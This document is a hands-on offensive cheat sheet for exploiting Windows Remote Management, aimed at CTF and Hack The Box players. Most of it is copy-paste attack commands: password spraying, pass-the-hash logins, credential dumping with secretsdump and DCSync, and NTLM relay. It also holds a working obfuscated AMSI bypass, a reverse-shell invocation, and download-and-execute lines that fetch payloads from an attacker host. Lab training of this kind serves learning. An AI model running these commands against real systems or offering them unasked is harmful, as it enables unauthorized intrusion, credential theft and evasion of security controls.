> **WinRM (Windows Remote Management)** is Microsoft's implementation of the WS-Management (WS-Man) protocol, used for remote administration of Windows systems. It uses SOAP over HTTP/HTTPS and is a primary attack vector in CTFs and HTB boxes — once you have valid credentials (password or NTLM hash), WinRM gives you an interactive PowerShell shell on the target. This guide covers exploitation from enumeration to full shell access.

---

## Quickstart — The 2-Minute Shell

```bash
# The most common CTF workflow:
# 1. Confirm WinRM is open
nmap -p 5985,5986 -sV 10.10.10.10

# 2. Get a shell with Evil-WinRM
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'

# 3. Or with a hash (Pass-the-Hash)
evil-winrm -i 10.10.10.10 -u Administrator -H 'aad3b435b51404ee...'
```

> 💡 **WinRM vs RDP:** WinRM gives you a PowerShell shell without a GUI. It's faster, stealthier, and works even when RDP is disabled. Ports: **5985** (HTTP), **5986** (HTTPS).

---

## WinRM Protocol Basics

| Feature | Detail |
| :------ | :----- |
| **Protocol** | WS-Man (WS-Management) over SOAP/XML |
| **HTTP Port** | 5985 (default, unencrypted) |
| **HTTPS Port** | 5986 (encrypted, SSL/TLS) |
| **Auth Methods** | NTLM, Kerberos, Basic Auth |
| **Endpoint** | `/wsman` |
| **Shell** | PowerShell (default) |

### How WinRM Authentication Works

```
1. Client → Server:  Negotiate / NTLM / Kerberos token
2. Server → Client:  Challenge (if NTLM)
3. Client → Server:  Response (challenge-response)
4. Server → Client:  Auth success → Shell session established
```

---

## Enumeration — Finding and Testing WinRM

### Nmap

```bash
# Quick port scan
nmap -p 5985,5986 -sV 10.10.10.10

# With WinRM-specific scripts
nmap -p 5985 --script http-winrm-info -script-args http.url=/wsman 10.10.10.10

# Full service detection
nmap -sV -sC -p 5985,5986 10.10.10.10
```

### CrackMapExec / NetExec

```bash
# Test authentication
netexec winrm 10.10.10.10 -u user -p 'Password123'

# Spray passwords across multiple users
netexec winrm 10.10.10.10 -u users.txt -p passwords.txt

# Test with hash
netexec winrm 10.10.10.10 -u user -H 'HASH_HERE'

# Execute command
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'whoami'
```

### Curl (Manual Test)

```bash
# Test WinRM endpoint
curl -k -u user:password \
  -H "Content-Type: application/soap+xml;charset=UTF-8" \
  -d '<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsman="http://schemas.microsoft.com/wsman/2003/01/wsman">
  <s:Header>
    <wsman:OperationID>1</wsman:OperationID>
  </s:Header>
  <s:Body>
    <wsman:Identify/>
  </s:Body>
</s:Envelope>' \
  http://10.10.10.10:5985/wsman
```

### PowerShell (From Windows)

```powershell
# Test WinRM connectivity
Test-WSMan -ComputerName 10.10.10.10

# Test with credentials
$cred = Get-Credential
Test-WSMan -ComputerName 10.10.10.10 -Credential $cred
```

---

## Evil-WinRM — The Primary Tool

Evil-WinRM is the industry-standard tool for WinRM exploitation on Linux. It provides a persistent interactive PowerShell shell with file transfer capabilities.

### Basic Usage

```bash
# With password
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'

# With NTLM hash (Pass-the-Hash)
evil-winrm -i 10.10.10.10 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH_HERE'

# With SSL (port 5986)
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -S
```

### File Transfer

```bash
# Inside Evil-WinRM shell:

# Upload file to target
upload /local/path/file.exe C:\Users\Administrator\file.exe

# Download file from target
download C:\Users\Administrator\passwords.txt /local/path/passwords.txt
```

### Loading PowerShell Scripts

```bash
# Start Evil-WinRM with a scripts directory
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -s /path/to/scripts/

# Inside the shell, the scripts are auto-loaded:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
Invoke-Mimikatz
```

### Loading Executables / DLLs

```bash
# Start Evil-WinRM with an executable directory
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -e /path/to/tools/

# Load a .NET assembly in memory
# (place the .dll in the -e directory)
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\tools\Rubeus.dll"))
```

### Evil-WinRM All Flags

| Flag | Purpose |
| :--- | :------ |
| `-i <ip>` | Target IP address |
| `-u <user>` | Username |
| `-p <pass>` | Password |
| `-H <hash>` | NTLM hash (Pass-the-Hash) |
| `-S` | Enable SSL (port 5986) |
| `-s <dir>` | PowerShell scripts directory |
| `-e <dir>` | Executables/dlls directory |
| `-c <cert>` | SSL certificate file |
| `-k <key>` | SSL key file |
| `-n` | Disable color output |
| `-r <relay>` | Relay target (for NTLM relay) |

---

## NetExec (CrackMapExec) — WinRM

```bash
# Authenticate
netexec winrm 10.10.10.10 -u user -p 'Password123'

# Execute command
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'whoami'

# Execute PowerShell
netexec winrm 10.10.10.10 -u user -p 'Password123' --exec-method winrm -x 'powershell -c "Get-Process"'

# Pass-the-Hash
netexec winrm 10.10.10.10 -u user -H 'HASH_HERE' -x 'whoami'

# Password spray
netexec winrm 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

---

## Impacket — Remote Execution via WinRM/WMI

### wmiexec.py (Most Reliable)

```bash
# With password
impacket-wmiexec 'DOMAIN/user:password@10.10.10.10'

# With NTLM hash
impacket-wmiexec 'DOMAIN/user@10.10.10.10' -hashes :HASH_HERE

# Execute specific command
impacket-wmiexec 'DOMAIN/user:password@10.10.10.10' 'whoami'
```

### winrm.py

```bash
# With password
impacket-winrm 'DOMAIN/user:password@10.10.10.10'

# With hash
impacket-winrm 'DOMAIN/user@10.10.10.10' -hashes :HASH_HERE
```

### atexec.py (Task Scheduler)

```bash
# Execute command via Task Scheduler
impacket-atexec 'DOMAIN/user:password@10.10.10.10' 'whoami'

# With hash
impacket-atexec 'DOMAIN/user@10.10.10.10' -hashes :HASH_HERE 'type C:\flag.txt'
```

### secretsdump.py (Credential Dumping)

```bash
# Dump SAM/LSA secrets
impacket-secretsdump 'DOMAIN/user:password@10.10.10.10'

# DCSync (if you have domain admin)
impacket-secretsdump 'DOMAIN/admin:password@dc01.lab.local'
```

---

## PowerShell Remoting (Native Windows)

If you have a Windows foothold, use native PowerShell for lateral movement.

### Interactive Session

```powershell
# Create credential object
$cred = Get-Credential

# Enter interactive session
Enter-PSSession -ComputerName 10.10.10.10 -Credential $cred

# Exit session
Exit-PSSession
```

### Remote Command Execution

```powershell
# Execute command on remote machine
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -ScriptBlock {
    whoami
    hostname
    Get-Process
}

# Execute local script on remote machine
Invoke-Command -ComputerName 10.10.10.10 -Credential $cred -FilePath C:\scripts\recon.ps1

# Run command on multiple machines
Invoke-Command -ComputerName server1,server2,server3 -Credential $cred -ScriptBlock {
    hostname
}
```

### Persistent Sessions

```powershell
# Create a persistent session
$session = New-PSSession -ComputerName 10.10.10.10 -Credential $cred

# Use the session
Invoke-Command -Session $session -ScriptBlock { whoami }

# Enter the session
Enter-PSSession -Session $session

# Remove session
Remove-PSSession $session
```

---

## Bypassing Restrictions

### Constrained Language Mode (CLM)

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# If ConstrainedLanguage, bypass with:
# 1. Use Evil-WinRM with -e flag to load .NET assemblies
# 2. Use AppLocker bypass techniques
# 3. Use InstallUtil.exe or msbuild.exe to execute C# code

# Evil-WinRM bypass (in shell):
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\tools\bypass.dll"))
```

### AMSI Bypass

```powershell
# Common AMSI bypass (paste before running scripts):
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### PowerShell Execution Policy

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# Or from within PowerShell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

---

## WinRM + NTLM Relay

If you can't directly authenticate but can relay captured NTLM hashes:

```bash
# Step 1: Start ntlmrelayx targeting WinRM
sudo ntlmrelayx.py -t http://10.10.10.10:5985/wsman -smb2support

# Step 2: Start Responder to capture hashes
sudo responder -I tun0

# Step 3: Wait for victim to authenticate
# ntlmrelayx will relay the NTLM auth to WinRM

# Alternative: Relay to WinRM and execute command
sudo ntlmrelayx.py -t http://10.10.10.10:5985/wsman -c "powershell -c whoami"
```

---

## WinRM over HTTPS (Port 5986)

```bash
# Evil-WinRM with SSL
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123' -S

# NetExec with SSL
netexec winrm 10.10.10.10 -u user -p 'Password123' -x 'whoami' --ssl

# Impacket with HTTPS
impacket-wmiexec 'DOMAIN/user:password@10.10.10.10' -scheme https
```

---

## Lateral Movement via WinRM

```bash
# From Evil-WinRM, pivot to another machine
# Upload a reverse shell to the first target, then connect to the second

# Or use PowerShell remoting from the first target:
# Inside Evil-WinRM shell:
Invoke-Command -ComputerName 10.10.10.20 -Credential $cred -ScriptBlock {
    IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')
}
```

### File Transfer Methods via WinRM

```bash
# Evil-WinRM native upload/download
upload /local/file.exe C:\temp\file.exe
download C:\Windows\debug\file.txt /local/file.txt

# PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')"

# PowerShell upload (to attacker SMB server)
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe"

# Certutil (Windows built-in)
certutil -urlcache -split -f http://10.10.14.5/file.exe C:\temp\file.exe
```

---

## CTF / HTB WinRM Workflow

### Step 1 — Identify WinRM

```bash
nmap -p 5985,5986 -sV 10.10.10.10
# Look for: ms-wsman or WinRM
```

### Step 2 — Find Credentials

```bash
# Search for creds in web files, configs, databases
# Check Responder captures: /usr/share/responder/logs/
# Check SMB shares
# Crack captured NTLMv2 hashes: john --format=netntlmv2 hash.txt
# Look for files with passwords on the target
```

### Step 3 — Authenticate

```bash
# Test with Evil-WinRM
evil-winrm -i 10.10.10.10 -u user -p 'Password123'

# Or with hash
evil-winrm -i 10.10.10.10 -u user -H 'HASH'
```

### Step 4 — Enumerate & Escalate

```bash
# Inside Evil-WinRM shell:
whoami /all          # check privileges
systeminfo           # OS info
ipconfig /all        # network info
net user             # list users
net localgroup administrators  # admin check

# Upload and run privilege escalation tools
upload /tools/PowerUp.ps1 .
Invoke-Expression (Get-Content PowerUp.ps1 -Raw)
Get-ModifiableService
```

### Step 5 — Lateral Movement

```bash
# From Evil-WinRM, connect to another machine
evil-winrm -i 10.10.10.20 -u user -p 'Password123'

# Or use PowerShell remoting from the shell
Enter-PSSession -ComputerName 10.10.10.20 -Credential $cred
```

---

## Tools Cheat Sheet

| Tool | Purpose | Install |
| :--- | :------ | :------ |
| **Evil-WinRM** | Interactive WinRM shell | `sudo apt install evil-winrm` |
| **NetExec** | Auth testing, command exec | `pip install netexec` |
| **Impacket** | wmiexec, winrm, atexec, secretsdump | `pip install impacket` |
| **Responder** | Capture NTLM hashes | `sudo apt install responder` |
| **PowerShell** | Native remoting (from Windows) | Built-in |

---

## CTF / HTB WinRM Workflow Checklist

1. **Enumerate** — `nmap -p 5985,5986 -sV` to confirm WinRM is open
2. **Find credentials** — search web files, crack Responder captures, check SMB shares, read config files
3. **Test auth** — `evil-winrm -i TARGET -u USER -p 'PASS'` or `netexec winrm TARGET -u USER -p PASS`
4. **Get shell** — Evil-WinRM for interactive, NetExec for quick commands
5. **Enumerate** — `whoami /all`, `systeminfo`, `ipconfig /all`, `net user`, `net localgroup administrators`
6. **Escalate** — upload PowerUp.ps1, SharpHound, or other privesc tools via `upload`
7. **Lateral move** — use credentials on other machines via Evil-WinRM or PowerShell remoting
8. **Dump secrets** — `impacket-secretsdump` for SAM/LSA if you have admin

---

## Troubleshooting

| Issue | Cause | Fix |
| :---- | :---- | :-- |
| "Connection refused" on 5985 | WinRM not enabled or firewall | Try 5986 (HTTPS), check if service is running |
| "Unauthorized" | Wrong credentials | Verify username/password or hash |
| "SSL certificate verify failed" | Self-signed cert | Use `-S` flag with Evil-WinRM, or `--disable-ssl-cert-validation` |
| "WinRM firewall exception" | WinRM not configured | On target: `winrm quickconfig` (requires admin) |
| "Access denied" | User not in remote management group | User needs WinRM permissions (Remote Management Users group) |
| Shell hangs after command | Session timeout | Reconnect, or use `Invoke-Command` for non-interactive |
| AMSI blocking scripts | Antimalware Scan Interface | Use AMSI bypass before running scripts |
| Constrained Language Mode | AppLocker / WDAC policy | Use .NET assembly loading via Evil-WinRM `-e` flag |
| Evil-WinRM won't connect | Wrong port or SSL | Try `-S` for SSL, verify port with nmap |
| "The WinRM client cannot process the request" | Auth method mismatch | Try NTLM explicitly, or use Kerberos with `-k` |

---

## Installing Tools

```bash
# Evil-WinRM
sudo apt install evil-winrm          # Debian/Kali
gem install evil-winrm                # Ruby gem
git clone https://github.com/Hackplayers/evil-winrm

# NetExec (formerly CrackMapExec)
pip install netexec                   # pip
sudo apt install netexec              # Debian/Kali

# Impacket (wmiexec, winrm, atexec, secretsdump)
pip install impacket                  # pip
sudo apt install python3-impacket     # Debian/Kali

# Responder (NTLM hash capture)
sudo apt install responder            # Debian/Kali
git clone https://github.com/lgandx/Responder

# Hashcat / John (for cracking captured hashes)
sudo apt install hashcat john         # Debian/Kali
```

---

## References

- [HackTricks — WinRM](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/winrm)
- [Hacking Articles — WinRM Penetration Testing](https://www.hackingarticles.in/winrm-penetration-testing/)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [NetExec Wiki](https://www.netexec.wiki/)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [Microsoft — WS-Management Protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol)
- [NetSPI — Exploiting Trusted Hosts in WinRM](https://www.netspi.com/blog/technical-blog/adversary-simulation/exploiting-trusted-hosts-in-winrm/)
- [PayloadsAllTheThings — WinRM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20WinRM%20Methodology.md)
